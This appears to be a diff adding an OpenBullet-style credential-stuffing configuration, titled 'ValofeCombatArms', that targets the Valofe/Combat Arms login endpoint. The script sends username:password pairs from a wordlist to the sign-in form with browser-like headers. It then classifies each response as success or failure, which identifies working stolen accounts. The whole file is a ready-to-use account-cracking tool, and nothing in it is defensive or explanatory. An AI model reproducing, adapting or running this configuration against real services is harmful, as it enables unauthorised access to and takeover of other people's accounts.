@@ -1,0 +1,39 @@
+[SETTINGS]
+{
+  "Name": "ValofeCombatArms",
+  "SuggestedBots": 1,
+  "LastModified": "2018-07-09T14:32:54.9850377+00:00",
+  "AdditionalInfo": "",
+  "Author": "boggy94",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://vfun.valofe.com/membership/signin_proc" AutoRedirect=TRUE 
+  CONTENT "service_code=ca_classic&ret=https%3A%2F%2Fcombatarms-c.valofe.com%2Fevent%2Frestore&input_user_id=<USER>&input_user_password=<PASS>&check_user_id_save=on" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://vfun.valofe.com" 
+  HEADER "Referer: https://vfun.valofe.com/membership/signin?service_code=ca_classic&ret=https%3A%2F%2Fcombatarms-c.valofe.com%2Fevent%2Frestore" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "\":-99}" 
+    KEY "\":-96}" 
+  KEYCHAIN Success OR 
+    KEY "result\":1" 
